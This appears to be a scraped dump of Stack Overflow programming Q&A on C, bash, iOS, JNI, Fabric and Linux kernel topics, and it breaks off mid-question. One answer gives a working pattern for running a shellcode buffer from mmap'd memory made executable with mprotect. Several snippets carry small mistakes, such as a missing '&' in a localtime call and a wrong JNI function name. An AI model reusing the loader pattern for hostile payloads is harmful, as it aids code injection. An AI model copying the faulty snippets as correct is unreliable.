<p>2) the real problem: the long long argument isn't passed correctly (i get 0 every time)</p>

<p><strong>I am clearly missing something, so can anyone please explain (in details) why the macro isn't working properly, or suggest another approach?</strong></p>

<p><code>EDIT</code>: I add here the storing arguments part (the relevant details, I parse a va_list), it gets their type based on a format specifier:</p>

<pre><code>while (*format)
{
    switch(*format)
    {
        case 's':
            saved_arguments[i] = strdup(arg);
            break;
        case 'l':
            saved_arguments[i] = malloc(sizeof(long long));
            *((long long *) saved_arguments[i]) = arg;
            break;
    }
    i++;
    format++;
}
</code></pre>
","9530","","<p>Use the <a href=""http://www.gnu.org/software/libffcall/"" rel=""nofollow"">foreign function call library</a>, it takes care of all the grungy platform-specific details for you.  For example, here's how you might postpone a function call to a function taking an <code>int</code>, <code>void*</code>, and <code>long long</code> parameters and returning <code>int</code>:</p>

<pre><code>#include &lt;avcall.h&gt;

int my_function(int a, void *b, long long c)
{
    // Do stuff
}

...

av_list alist;    // Stores the argument list
int return_value; // Receives the return value

// Initialize the argument list
av_start_int(alist, &amp;my_function, &amp;return_value);

// Push the arguments onto the list
av_int(alist, 42);                 // First arg 'a'
av_ptr(alist, &amp;something);         // Second arg 'b'
av_longlong(alist, 5000000000LL);  // Third arg 'c'

// We're done -- stash away alist and return_value until we want to call the
// function later.  If the calling function needs to return, then you'll need
// to allocate those variables on the heap instead of on the stack

...

// Now we're ready to call the stashed function:
av_call(alist);
// Return value from the function is now stored in our return_value variable
</code></pre>
"
"<p>I usually declare the rects &amp; colours in static const format in my view controllers like this for example. (these are compile time)</p>

<pre><code>#import ""something.h""

static const CGRect someRect = { w, x, y, z };
static const uint8_t someColor[] = { 255, 0 , 0}

@implementation

// other methods

@end
</code></pre>

<p>This way <strong>doesn't work very well</strong> when it comes to device specific scenarios. For example if I want to make the rect a bit higher for <strong>iPhone5 &amp; iPod Touch 5th generation</strong> there is no way to determine this in compile time. (for iPhone 5 may be we can add pre processor macro in build settings for armv7s architecture -> img below), but for iTouch the architecture is armv7 &amp; this would clash with iPhone4S as well, also if Apple were to release new devices with mixed size screens in same architecture in future, this approach is literally screwed. </p>

<p><img src=""http://i.stack.imgur.com/ri8UY.png"" alt=""preprocessor macro""></p>

<p>My question is what would be a workaround / a fix or alternative to this. ? I'll also list down few things in mind but I'd like to know your opinion &amp; best practices for doing something like this. </p>

<p>1 - do it the same way assuming its for the older 320x480 device and make the UI elements expand or grow ( autoresizingmask )  as it gets the correct screen size assigned in runtime. </p>

<p>2 - use +initialize() method, this would be runtime (contrast to compile time in  original approach) but you will have access to all the sophisticated methods to find the screen size &amp; device types. </p>

<p>or some other way(s) because all methods above are stupid.</p>
","9530","","<p>Don't try to detect the device at compile-time, that's impossible.  You can't know in advance what kind of device your code will run on, since as you said, Apple could release future iOS devices running on armv7s with different hardware characteristics from the iPhone 5/iPod 5.</p>

<p>Instead, you need to detect the device type at runtime and then take appropriate actions.  Since certain features such as the screen size won't be known until runtime, then obviously they can't be compile-time constants, so you'll need to restructure your code accordingly.</p>

<p>Ideally, you shouldn't be trying to detect specific *device types and then act based on that; instead, determine which <em>features</em> you have/need, and act on that.  For example, get the screen size at runtime instead of hard-coding several devices' different screen sizes.  Detect if you have a camera, and then decide to take a photo based on that, etc.  Detect if the device supports OpenGL ES v2.0, then change your rendering code based on that.  And so on.</p>

<p>But if you really do need to detect the specific device model, <a href=""http://stackoverflow.com/questions/448162/determine-device-iphone-ipod-touch-with-iphone-sdk"">this question</a> has several answers showing you how.</p>
"
"<p>I'm new in iOS</p>

<p>now i counter a problem </p>

<pre><code>#define strncasecmp _strnicmp
</code></pre>

<p>it has a warning:</p>

<pre><code>implicit declaration of function '_strnicmp' is invalid in C99
</code></pre>

<p>and also has error:</p>

<pre><code>Undefined symbols for architecture armv7:
""__strnicmp"", referenced from:
  _AVI_open_input_file in avilib.o
ld: symbol(s) not found for architecture armv7
clang: error: linker command failed with exit code 1 (use -v to see invocation)
</code></pre>

<p>How to solve this problem?</p>
","9530","","<p>Quite simply, your C runtime doesn't have the function <code>_strnicmp</code>, which is a <a href=""http://msdn.microsoft.com/en-us/library/chd90w8e%28v=vs.90%29.aspx"" rel=""nofollow"">Microsoft-specific function</a>, not a standard C function.</p>

<p>You should remove that <code>#define</code> and use the function <code>strncasecmp</code>, since <code>strncasecmp</code> is a <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/strcasecmp.html"" rel=""nofollow"">POSIX function</a>, and iOS is POSIX-compliant.</p>
"
"<p>I'm new in C, one thing is driving me crazy is how to make visible to all files of my project a typedef struct...Maybe is a design error, not sure...</p>

<p>The stage is I have a typedef struct like this </p>

<pre><code>// File header.h
typedef struct stu {
    char name[60];
    char id[10];
    int age;
    float puntuation;
} Student;
</code></pre>

<p>The I have several data structures where I want to use this typedef, I have a Stack, a hash table and a binary tree...I include all in main.c</p>

<pre><code>// File main.c
#include ""header.h""
#include ""hashtable.h""
#include ""stack.h""
#include ""tree.h""
</code></pre>

<p>I need to use Student in hashtable and stack, and also need to use another typedef defined in stack in the tree but I'm not able to get it working...</p>

<p>The compiler says type name 'stack_def' unknown in tree.h and tree.c, if I exclude stack.h in main.c and include it in tree.h then it says the same in stack.h for the typedef Student.</p>

<p>Can someone, please, tell me what's going on here?</p>

<p>Thanks.</p>
","9530","","<p>My psychic powers tells me that you have a circular reference in your header files—you have two header files <code>a.h</code> and <code>b.h</code>, where each <code>#include</code>s the other (or possibly a longer chain, such as <code>a.h</code> including <code>b.h</code>, which includes <code>c.h</code>, which includes <code>a.h</code>).</p>

<p>To fix that, you need to remove unnecessary inclusions—only have each header file include the bare minimum of other headers it needs to compile correctly.  If you only need to use pointers to certain types (without the full definitions), you can use <em>forward declarations</em>  instead of including the types:</p>

<pre><code>// Forward declaration of `stu' -- we can now use pointers to `stu', but not
// any of the members of `stu' etc.
struct stu;

// Pointer to `stu' -- OK
struct other_struct
{
    struct stu *a_pointer;
};

// Function parameters and return value of `stu' -- OK
struct stu function_taking_stu_and_returning_stu(struct stu arg);

// `stu' instance -- ERROR
struct another_struct
{
    struct stu not_a_pointer;  // ERROR -- `stu' is incomplete
};
</code></pre>

<p>Once you remove the circular dependencies from your header files, then it should compile properly.</p>
"
"<p>Say I am using C and C++ and I want to execute a script made in C from within a terminal emulator in android so that it opens an activity, a GUI. Is it possible? and how do I do it?</p>

<p>I wouldn't care using assembly, my tablet's processor is ARMv7. if the answer is somewhere in there. </p>
","9530","","<p>You start an Android Activity that same way you would in Java, by constructing an appropriate <a href=""http://developer.android.com/reference/android/content/Intent.html""><code>Intent</code></a> instance and then calling <a href=""http://developer.android.com/reference/android/content/Context.html#startActivity%28android.content.Intent%29""><code>Context.startActivity()</code></a>.  The main difference is that you need to thunk into Java via <a href=""http://en.wikipedia.org/wiki/Java_Native_Interface"">JNI</a> in order to do so from C or C++.</p>

<p>Look into functions like <code>GetMethodID</code> and <code>CallVoidMethod</code> within the <code>JNIEnv</code> class—using those, you can call a Java function from C++ code.  Then you just need a small amount of Java glue code to do what you want.</p>
"
"<p>In C it is not normally possible to use <code>'</code> for <code>printf</code> of a string. However, I have text which are full of double quote <code>""</code>, and I need to escape all of them as</p>

<pre><code>printf(""This is \""test\"" for another \""text\"""");
</code></pre>

<p>Is it possible to <code>printf</code> in a way without escaping <code>""</code>. I mean using another character for wrapping the string.</p>
","9530","","<p>No, that is not possible in the C language.  There is only one syntax for string literals, and that is that they are delimited by double quotes.</p>

<p>The only way to write unescaped quotation marks is as character literals inside character arrays, which is uglier and more difficult to write, so there's very little reason to do so in a case like this:</p>

<pre><code>char array[] = {'T', 'h', 'i', 's', ' ', 'i', 's', ' ', '""'};  // etc.
printf(""%s"", array);
</code></pre>
"
"<p>When extending std::exception, I am wondering the proper way of overriding what()?</p>

<p>Lets say I have an exception class :</p>

<pre><code>class MyException : public std::exception {
  public:
    MyException(const string&amp; _type) : m_type(_type) {}

    virtual const char* what() const throw() {
      string s = ""Error::"" + _type;
      return s.c_str();
    }
}
</code></pre>

<p>I have used a static analysis tool on the above code, and it is complaining that the string s will leave the scope and destroy the memory associated with the string, so it could potentially be a problem if I use what() in some part of my code.</p>

<p>If there a proper way of returning a const char* from a function without these issues retaining proper memory management?</p>
","9530","","<p>You need to store the <code>string</code> instance inside your class, otherwise the memory for it will be freed when your <code>what()</code> function returns, leaving the caller with a dangling pointer:</p>

<pre><code>class MyException : public std::exception {
  public:
    MyException(const std::string&amp; _type)
      : m_what(""Error::"" + _type)
    {
    }

    virtual const char* what() const throw() {
      return m_what.c_str();
    }

  private:
    std::string m_what;
}
</code></pre>
"
"<p>i'm new with bash script so please keep calm with me ^^</p>

<p>I want to write bash script that request 2000 cURL request</p>

<p>is it fast &amp; possible ?</p>

<p>or what should I do for this situation ?</p>

<p>Thanks</p>

<p><strong>EDIT</strong></p>

<p>This is the script I got it from here</p>

<pre><code>#!/bin/bash

url=http://www.***.com/getaccount.php?username=
while read users
do
content=$(curl ""{$url}${users}"")
echo $users
echo $content &gt;&gt; output.txt
done &lt; users.txt
</code></pre>

<p>which users.txt has 2000 username </p>

<p>the question is, is it fast ? because I have to call that script every minute with my crontab .. so it is good for me ? or should I use another language just like Perl or whatever.</p>

<p>before I did 2000 request by crontab but it is very bad idea to add 2000 line to the crontab</p>

<p>so any idea ?</p>
","9530","","<p>If all of the URLs you're requesting follow a simple pattern (such as all of the numbered pages from <code>page1.html</code> through <code>page2000.html</code>), then curl itself can easily download them all in one command line:</p>

<pre><code># Downloads all of page1.html through page2000.html.  Note the quotes to
# protect the URL pattern from shell expansion.
curl --remote-name-all 'http://www.example.com/page[1-2000].html'
</code></pre>

<p>See the section labeled ""URL"" in the <a href=""http://curl.haxx.se/docs/manpage.html"" rel=""nofollow"">manual page</a> for more information on URL patterns.</p>

<p>If you have a lot of URLs which don't follow a numeric pattern, you can put all of the URLs into a file use the <code>-K</code> option of curl to download them all in one go.  So, using your example, what you'd want to do is modify your file to convert the usernames into URLs with a prefix of <code>url =</code>.  One way to do that is with the <a href=""http://linux.die.net/man/1/sed"" rel=""nofollow""><code>sed(1)</code></a> utility</p>

<pre><code># Convert list of usernames into a curl options file
sed 's|^\(.*\)$|url = http://www.***.com/getaccount.php?username=\1|' users &gt; curl.config

# Download all of the URLs from the config file
curl --remote-name-all -K curl.config
</code></pre>

<p>This will be much faster than downloading individual files in separate commands, because curl can then enable <a href=""http://en.wikipedia.org/wiki/Http_pipelining"" rel=""nofollow"">HTTP pipelining</a> within a single process.  That way, it sets up a single TCP stream that gets reused for multiple requests, instead of needing to setup a new TCP stream for each request just to tear it down again, which is what would happen if you made each request in a separate process.</p>

<p>Do note, though, that such a large automated download may violate a site's terms of use.  You should check a site's <code>robots.txt</code> file before doing such a task, and make sure you're not exceeding their rate limits.</p>
"
"<p>I'm trying to run some assembly code saved in a buffer on OS X, but I keep getting a segmentation fault. The code looks like this:</p>

<pre><code>int main()
{
    unsigned char buff[] = ""\x66\x6a\7f\x66\xb8\x01\x00\x00\x00\x66\x83\xec\x04\xcd\x80"";
    ( void (*)()buff )(); /* same as calling return 127 */
    return 0;             /* program should never reach here */
}
</code></pre>

<p>The code in buff is generated by nasm and it works, it causes the program to return 127. When running through a c program like so though, I get a segmentation fault. Is there a different way to do this in OS X?</p>
","9530","","<p>The stack is non executable by default -- you need to mark a page as executable with <a href=""https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man2/mprotect.2.html"" rel=""nofollow""><code>mprotect(2)</code></a> in order to make it executable.  Making the stack executable is highly not recommended, so if you want to run code generated at runtime, you should allocate memory on the heap instead.</p>

<p>For example:</p>

<pre><code>#include &lt;sys/mman.h&gt;
#include &lt;unistd.h&gt;

...

// Error checking omitted for expository purposes

// Allocate 1 page of read-write memory
size_t page_size = getpagesize();
void *mem = mmap(NULL, page_size,
                 PROT_READ | PROT_WRITE,
                 MAP_ANON | MAP_PRIVATE,
                 -1, 0);
// Copy the shell code into the memory
char shellcode[] = ""..."";
memcpy(mem, shellcode, sizeof(shellcode));

// Change memory to executable and non-writable
mprotect(mem, page_size, PROT_READ | PROT_EXEC);

// Run the code
((void (*)())mem)();

// Free the memory
munmap(mem, page_size);
</code></pre>
"
"<p>I'm writing a program that will interface with another machine running Java, and I need to send character arrays over the network. On the receiving end, the Java program uses DataInputStream's readChar() function and expects characters. However, since characters are stored as 1 byte in C, I'm having some trouble writing to the network.</p>

<p>How would I go about converting this?</p>

<p>The actual protocol specification is like so:</p>

<pre><code>short: Contains length of char array
char 1, 2, 3...: The characters in the array
</code></pre>

<p>For background information, my short conversion is like so:</p>

<pre><code>char *GetBytesShort(short data)
{
    short net_data = NET_htons(data);
    char *ptr = (char *) malloc(sizeof(short));
    memcpy(ptr, &amp;net_data, sizeof(short));
    return ptr;
}
</code></pre>

<p>I've tested it on the receiving end in Java, and the short does get sent over correctly with the correct length, but the character array does not.</p>

<p>Thanks in advance!</p>
","9530","","<p>There are many ways to do it.  What you want to do is construct a buffer containing all of your data and then pass that onto the <a href=""http://linux.die.net/man/2/send"" rel=""nofollow""><code>send(2)</code></a> system call to send it along the socket.</p>

<p>The wire format for data is big-endian (aka network byte order), so you should make sure to store your values with the most-significant byte first.  I recommend just manually constructing the byte buffer to avoid endianness issues with your local system (see also <a href=""http://commandcenter.blogspot.com/2012/04/byte-order-fallacy.html"" rel=""nofollow"">The byte order fallacy</a>), e.g.:</p>

<pre><code>uint16_t dataLen = ...;  // Length of data, in characters
uint16_t *charData = ...;  // Character array

// Constructor packet data buffer to send.  Error checking omitted for
// expository purposes.
size_t packetSize = 2 + dataLen * 2;
uint8_t *packet = malloc(packetSize);

// Copy length into buffer, big-endian
packet[0] = (uint8_t)(dataLen &gt;&gt; 8);
packet[1] = (uint8_t)(dataLen &amp; 0xFF);

// Copy each character into the buffer, big-endian
for (uint16_t i = 0; i &lt; dataLen; i++)
{
    packet[2 + 2*i]     = (uint8_t)(charData[i] &gt;&gt; 8);
    packet[2 + 2*i + 1] = (uint8_t)(charData[i] &amp; 0xFF);
}

// We're done -- send the packet
send(sockfd, packet, packetSize, 0);
</code></pre>
"
"<p>A lot of similar questions, but hadn't found one for using a variable in the name this way:</p>

<pre><code>#!/bin/bash

# $1 should be 'dev' or 'stg'

dev_path=""/path/to/123""
stg_path=""/path/to/xyz""

# Use $1 as input to determine which path variable to 'execute'
${!\$1'/morepath'}
</code></pre>

<p>Using $1, I want to be able to reference either $dev_path or $stg_path ($1 == 'dev' or $1 == 'stg') and be able to reference the value of $1_path which would be '/path/to/123' or '/path/to/xyz'</p>

<p>so the result would either be:</p>

<pre><code>'/path/to/123/morepath' or '/path/to/xyz/morepath'
</code></pre>

<p>based upon $1 being 'dev' or 'stg'.</p>

<p>I've tried various iterations of using ! and \$ in various places from other posts, but no luck</p>
","9530","","<p>See the Bash manual section on <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Shell-Parameter-Expansion"">shell parameter expansion</a>:</p>

<blockquote>
  <p>If the first character of <em>parameter</em> is an exclamation point (!), a level of variable indirection is introduced. Bash uses the value of the variable formed from the rest of <em>parameter</em> as the name of the variable; this variable is then expanded and that value is used in the rest of the substitution, rather than the value of <em>parameter</em> itself. This is known as <code>indirect expansion</code>. The exceptions to this are the expansions of <code>${!prefix
  }</code> and <code>${!name[@]}</code> described below. The exclamation point must immediately follow the left brace in order to introduce indirection. </p>
  
  <p>[...]</p>
</blockquote>

<p>Since you also want to modify the name (by suffixing <code>_path</code>) before expanding again, you need to go through another variable:</p>

<pre><code># $1 should be 'dev' or 'stg'
dev_path=""/path/to/dev""
stg_path=""/path/to/stg""

path=${1}_path   # path is now either 'dev_path' or 'stg_path'

# Run either /path/to/dev or /path/to/stg
${!path}/bin/execute
</code></pre>

<p>Of course, if both of the <code>dev</code> and <code>stg</code> programs are in the same directory, then there's no need for all this, you can just directly expand <code>$1</code>:</p>

<pre><code>/path/to/$1/bin/execute
</code></pre>
"
"<p>Basically I am asking for a translation of:</p>

<blockquote>
  <p>GCC does not use the latitude given in C99 only to treat certain aspects of signed `&lt;&lt;' as undefined, but this is subject to change.</p>
</blockquote>

<p>(<a href=""http://gcc.gnu.org/onlinedocs/gcc-4.8.1/gcc/Integers-implementation.html#Integers-implementation"">GCC 4.8.1 manual, paragraph 4.5</a>)</p>

<p>What 'latitude' is given? Which certain aspects?</p>
","9530","","<p>C99 §6.5.7/3-4 lists two specific undefined behaviors regarding the left shift operator (<code>&lt;&lt;</code>):</p>

<blockquote>
  <p>3) [...] If the value of the right operand is negative or is greater than or equal to the width of the promoted left operand, the behavior is undefined.</p>
  
  <p>4) The result of <code>E1 &lt;&lt; E2</code> is [...]. If <code>E1</code> has a signed type and nonnegative value, and <code>E1</code> × 2<sup><code>E2</code></sup> is representable in the result type, then that is the resulting value; otherwise, the behavior is undefined.</p>
</blockquote>

<p>How exactly GCC behaves in these circumstances, I can't say.  It's perfectly welcome to give defined behavior in these situations; however, such code will still be undefined when compiled with other compilers.</p>

<p>My <em>guess</em> is that GCC treats signed left shifting identically to unsigned left shifting—that is, if computes <code>x &lt;&lt; y</code> as <code>(signed)((unsigned)x &lt;&lt; y)</code> by doing the bit shifts (potentially discarding any upper bits), and then reinterpreting the result as a signed quantity.  This has the implication that the most-significant value bit of a signed integer gets shifted into the sign bit; that seems a little strange from an arithmetic perspective but makes perfect sense from a bitwise perspective.</p>
"
"<p>As my title suggests, it's a theoretical question. I'd like to know that if java defines string as null terminated.</p>
","9530","","<p>Does it matter?</p>

<p>If you convert a Java string into some kind of serialized format (onto disk, the network, etc.), then all that matters is the serialization format, not the JVM's internal format.</p>

<p>If you're reading the string's data in C code via JNI, then you never read the data directly, you always use JNI functions like <a href=""http://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/functions.html#wp17158"" rel=""nofollow""><code>GetStringChars()</code></a> or <code>GetStringUTFChars()</code>.  <code>GetStringChars()</code> is not documented as returning null-terminated data, so you shouldn't assume that it's null-terminated—you must use <code>GetStringLength()</code> to determine its length.  Likewise with <code>GetStringUTFChars()</code>, you must use <code>GetStringUTF8Length()</code> to determine its length in <a href=""http://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/types.html#wp16542"" rel=""nofollow"">modified UTF-8 format</a>.</p>
"
"<p>I am experiencing some troubles with Fabric (version 1.7.0 on Ubuntu 13.04).</p>

<p>Consider this function:</p>

<pre><code>def does_not_work():
  with cd('/absolute/folder/one/'):
    with prefix('change_path_command'):
      with cd('/absolute/folder/two/'):
        run('some_random_command')
</code></pre>

<p>I expect it to execute the same command as:</p>

<pre><code>def works():
  run('cd /absolute/folder/one/ &amp;&amp; change_path_command &amp;&amp; cd /absolute/folder/two/ &amp;&amp; some_random_command')
</code></pre>

<p>However, here is the Fabric output of <code>fab does_not_work</code>:</p>

<pre><code>Requested: some_random_command
Executed: /bin/bash -l -c ""cd /absolute/folder/two/ &amp;&amp; change_path_command &amp;&amp; some_random_command""
</code></pre>

<p>It seems that nesting <code>cd</code>s is causing me troubles.</p>

<p>Is there a good explanation?</p>
","9530","","<p>The <a href=""http://docs.fabfile.org/en/1.7/api/core/context_managers.html#fabric.context_managers.cd"" rel=""nofollow""><code>cd</code> context manager</a> and the <a href=""http://docs.fabfile.org/en/1.7/api/core/context_managers.html#fabric.context_managers.prefix"" rel=""nofollow""><code>prefix</code> context manager</a> don't actually run commands when you invoke them, they just modify some local environment settings that affect any subsequent invocations of <code>run()</code> and/or <code>sudo()</code>.</p>

<p>So when your <code>run('some_random_command')</code> gets executed, it gets executed, it runs in the context of (<code>cd=/folder/one</code>, <code>prefix=change_path_command</code>, <code>cd=/folder/two</code>), and since the inner <code>cd</code> takes precedence over the outer <code>cd</code>, the end result is a single command executed with <code>cd /folder/two &amp;&amp; change_path_command &amp;&amp; some_random_command</code>.</p>

<p>Take a look at the source code for <a href=""https://github.com/fabric/fabric/blob/master/fabric/context_managers.py#L246"" rel=""nofollow""><code>cd</code></a> and <a href=""https://github.com/fabric/fabric/blob/master/fabric/context_managers.py#L370"" rel=""nofollow""><code>prefix</code></a> to a get a better idea of how that works -- all they ultimately do is modify the dictionary <code>fabric.state.env</code> when they enter and exit.  These later get applied in the call to <a href=""https://github.com/fabric/fabric/blob/master/fabric/operations.py#L634"" rel=""nofollow""><code>_prefix_commands()</code></a>, which gets called from <code>run()</code> and <code>sudo()</code> via the <code>_run_command()</code> function.</p>
"
"<p>I've seen an interesting statement today with post-increment and pre-increment. Please consider the following program-</p>

<pre><code>#include &lt;stdio.h&gt;

int main(){
    int x, z;

    x = 5;
    z = x++ - 5; // increase the value of x after the statement completed.
    printf(""%d\n"", z); // So the value here is 0. Simple.

    x = 5;
    z = 5 - ++x; // increase the value of x before the statement completed.
    printf(""%d\n"", z); // So the value is -1.

    // But, for these lines below..

    x = 5;
    z = x++ - ++x; // **The interesting statement
    printf(""%d\n"", z); // It prints 0

    return 0;
}
</code></pre>

<p>What's going on there actually in that interesting statement? The post-increment is supposed to increase the value of x after the statement completed. Then the value of <strong><em>first x</em></strong> is remain 5 for that statement. And in case of pre-increment, the value of <strong><em>second x</em></strong> should be 6 or 7 (not sure).<br>
<br>Why does it gives a value of 0 to z? Was it <strong>5 - 5</strong> or <strong>6 - 6</strong>? Please explain.</p>
","9530","","<p>It's <strong>Undefined Behavior</strong>.  The compiler is free to do whatever it wants -- it may give 0, it may give 42, it may erase your hard drive, or it may cause demons to fly out of your nose.  All of those behaviors are permitted by the C and C++ language standards.</p>
"
"<p>I'm currently authoring a library to handle information from the Raw Input API and I'm handling everything with <em>cascading functions</em>. This has resulted in several, very small, very readable, and very focused functions.</p>

<p>But, it has just hit me that I don't understand how to <strong>properly</strong> indicate failure to Windows. I have the function:</p>

<pre><code>/* OnInput: Handle data received from Windows via a `WM_INPUT` message. */
static LRESULT CALLBACK OnInput(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    BOOL DispatchRawInput(CONST PRAWINPUT);

    assert(msg == WM_INPUT);

    return DefWindowProc(hWnd, msg, wParam, lParam);
}
</code></pre>

<p>And it returns zero <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms645590.aspx"" rel=""nofollow"">as the documentation states it should</a>; but this assumes success.</p>

<p>The actual text states:</p>

<blockquote>
  <p>""If an application processes this message, it should return zero.""</p>
</blockquote>

<p>But what do I do if I <em>can't</em> handle it? I originally assumed you'd just call <code>DefWindowProc</code> and leave it at that but that doesn't signal to Windows that anything happened.</p>

<p>The message <code>WM_CREATE</code> seems to be the only instance I can find that returns something other than zero:</p>

<blockquote>
  <p>""If an application processes this message, it should return zero to continue creation of the window. If the application returns –1, the window is destroyed and the CreateWindowEx or CreateWindow function returns a NULL handle.""</p>
</blockquote>

<p>Is error handling really just up to the programmer/team and not a necessity to inform the operating system? What about events like <code>WM_CREATE</code> that fail and need to prevent the creation of a window?</p>
","9530","","<p>If it's a fatal error, then you should handle it the same as an other fatal error: inform the user of the error somehow (<code>MessageBox</code>, <code>stderr</code>, etc.) and <code>exit()</code> or <code>abort()</code>.</p>

<p>If it's a non-fatal error, then you need to communicate that back to your application, which can be done in a number of ways: set a flag, call a function, post a <code>WM_APP</code> message, etc., and your application should handle it.  All in all, Windows doesn't really care, and it's your responsibility to handle the error in a reasonable fashion.</p>

<p>If you're writing a library intended to be used by others, then make sure your application has a clearly defined and documented error procedure.  If an internal error happens within your library, then allow the application to specify an error callback, and then call that callback and let the application handle it.</p>
"
"<p>I am trying to remove leading/trailing whitespace characters with help below helper function. 
When compiling i am getting warning: array subscript has type ‘char’ [-Wchar-subscripts] 
how to get rid of this message. </p>

<pre><code>  char *removeSpace(char *str )
  {
     char *end;

     // Trim leading space
     while(isspace(*str)) 
     str++;

    if(*str == 0)  // All spaces?
    return str;

   // Trim trailing space
   end = str + strlen(str) - 1;
   while(end &gt; str &amp;&amp; isspace(*end)) end--;

   // Write new null terminator
   *(end+1) = 0;

   return str;
 }
</code></pre>
","9530","","<p>The code you posted doesn't have any array subscripting at all, but that error is caused by code like this:</p>

<pre><code>int array[256];
char c = ...;
array[c] = ...;
</code></pre>

<p>The line <code>array[c]</code> is very likely a bug, because the type <code>char</code> can be signed or unsigned—it's up to the compiler.  If <code>char</code> is signed, then it's possible for <code>c</code> to be negative, in which case accessing a negative array index leads to Undefined Behavior.</p>

<p>The fix is to make sure you never use a <code>char</code> variable as an array index—always cast to an unsigned type first, and always make sure that your value is in range.  If you're running on a system with 8-bit <code>char</code>s (i.e. <code>CHAR_BIT</code> is 8), then a 256-element array will always be able to store all possible <code>unsigned char</code> values, and you can omit the bounds check:</p>

<pre><code>int array[256];
char c = ...;
array[(unsigned char)c] = ...;  // Always ok, if CHAR_BIT &lt;= 8
</code></pre>
"
"<p><strong>Disclosure:</strong> I'm fairly new to C. If you could explain any answers verbosely, I would appreciate it.</p>

<p>I am writing a linux kernel module, and in one of the functions I am writing I need to copy a structure to userspace that looks like this:</p>

<pre><code>typedef struct
{
    uint32_t  someProperty;
    uint32_t  numOfFruits;
    uint32_t  *arrayOfFruits;
} ObjectCapabilities;
</code></pre>

<p>The API I'm implementing has documentation that describes the <code>arrayOfFruits</code> member as ""an array of size <code>numOfFruits</code> where each element is a FRUIT_TYPE constant."" I am confused how to do this, given that the arrayOfFruits is a pointer. When I <code>copy_to_user</code> the <code>ObjectCapabilities</code> structure, it will only copy the <em>pointer</em> <code>arrayOfFruits</code> to userspace. </p>

<p>How can userspace continuously access the elements of the array? Here is my attempt:</p>

<pre><code>ObjectCapabilities caps;
caps.someProperty = 1024;
caps.numOfFruits  = 3;
uint32_t localArray[] = {
        FRUIT_TYPE_APPLE,
        FRUIT_TYPE_ORANGE,
        FRUIT_TYPE_BANANA
};
caps.arrayOfFruits = localArray;
</code></pre>

<p>And then for the copy... can I just do this?</p>

<pre><code>copy_to_user((void *)destination, &amp;caps, (sizeof(caps) + (sizeof(localArray) / sizeof((localArray)[0]))));
</code></pre>
","9530","","<p>You can't copy raw pointers, since a pointer into kernel space is meaningless to userspace (and will segfault if dereferenced).</p>

<p>The typical way of doing something like this is to ask the userspace code to allocate the memory and pass in a pointer to that memory into a system call.  If the program doesn't pass in a large enough buffer, then fail with an error (e.g. <code>EFAULT</code>).  If there's no way for the program to know in advance a priori how much memory it will need, then typically you'd return the amount of data needed when passed a <code>NULL</code> pointer.</p>

<p>Example usage from userspace:</p>

<pre><code>// Fixed-size data
typedef struct
{
    uint32_t  someProperty;
    uint32_t  numOfFruits;
} ObjectCapabilities;

// First query the number of fruits we need
ObjectCapabilities caps;
int r = sys_get_fruit(&amp;caps, NULL, 0);
if (r != 0) { /* Handle error */ }

// Now allocate memory and query the fruit
uint32_t *arrayOfFruits = malloc(caps.numOfFruits * sizeof(uint32_t));
r = sys_get_fruit(&amp;caps, arrayOfFruits, caps.numOfFruits);
if (r != 0) { /* Handle error */ }
</code></pre>

<p>And here's how the corresponding code would look in kernel space on the other side of the system call:</p>

<pre><code>int sys_get_fruit(ObjectCapabilities __user *userCaps, uint32_t __user *userFruit, uint32_t numFruits)
{
    ObjectCapabilities caps;
    caps.someProperty = 1024;
    caps.numOfFruits  = 3;

    // Copy out fixed-size data
    int r = copy_to_user(userCaps, &amp;caps, sizeof(caps));
    if (r != 0)
        return r;

    uint32_t localArray[] = {
        FRUIT_TYPE_APPLE,
        FRUIT_TYPE_ORANGE,
        FRUIT_TYPE_BANANA
    };

    // Attempt to copy variable-sized data.  Check the size first.
    if (numFruits * sizeof(uint32_t) &lt; sizeof(localArray))
        return -EFAULT;
    return copy_to_user(userFruit, localArray, sizeof(localArray));
}
</code></pre>
"
"<p>I am trying to include system date in a program, which would calculate the total value of days since 2000. So that I could compare values of various dates (like- Antivirus update date, OS updation date) with it in order to find what is the delay in system updation. The procedure of finding date in C was killing me so I used system command to find out the current date.</p>

<pre><code>    system(""date/t &gt; system_date.txt"");
</code></pre>

<p>I want to read the date from this file. There was no problem if the date was all in digits(ex.- 03/09/13). But the date displayed from DOS is of type : 03-Sep-13 . If I use sscanf as follows:</p>

<pre><code>    FILE *fp_date=fopen(""system_date.txt"",""r"");
    char buffer[11];   int day,yr;   char yr[3];
    fgets(buffer,11,fp_date);
    sscanf(""%d-??????-%d"",&amp;day,&amp;mon,&amp;yr);
</code></pre>

<p>Now how do I scan these separately with their data types? I don't know what to use in place of ??????. Or the other method which I have been using is to store whole line in an array, then run for loops to get elements separated by '-'. But I just wanted to be a bit more sophisticated. Thanks...</p>
","9530","","<p>Don't do that.  Just use <a href=""http://linux.die.net/man/2/time"" rel=""nofollow""><code>time(2)</code></a> (C89) or <a href=""http://linux.die.net/man/3/gettimeofday"" rel=""nofollow""><code>gettimeofday(3)</code></a> (POSIX) to get the current system time in <a href=""https://en.wikipedia.org/wiki/Unix_time"" rel=""nofollow"">Unix time format</a>.  If you need to convert that to other forms like a string representation or a <code>struct tm</code> object, then you can use various conversion functions such as <a href=""http://linux.die.net/man/3/ctime"" rel=""nofollow""><code>ctime(3)</code>, <code>gtime(3)</code>, and <code>localtime(3)</code></a>.</p>

<pre><code>#include &lt;time.h&gt;

time_t now = time(NULL);
printf(""The current time is: %s\n"", ctime(&amp;now));  // Warning: not thread-safe

struct tm *now_tm = localtime(now);  // Warning: not thread-safe
printf(""Year=%d month=%d day=%d\n hour=%d minute=%d second=%d"",
       1900 + now_tm-&gt;tm_year,
       1 + now_tm-&gt;tm_mon,
       now_tm-&gt;tm_mday,
       now_tm-&gt;tm_hour,
       now_tm-&gt;tm_min,
       now_tm-&gt;tm_sec);
</code></pre>
"
"<p>Do global pointers have a scope that exist between threads?</p>

<p>For instance, suppose I have two files, file1.c and file2.c:</p>

<p>file1.c:</p>

<pre><code>uint64_t *g_ptr = NULL;

modify_ptr(&amp;g_ptr) { 
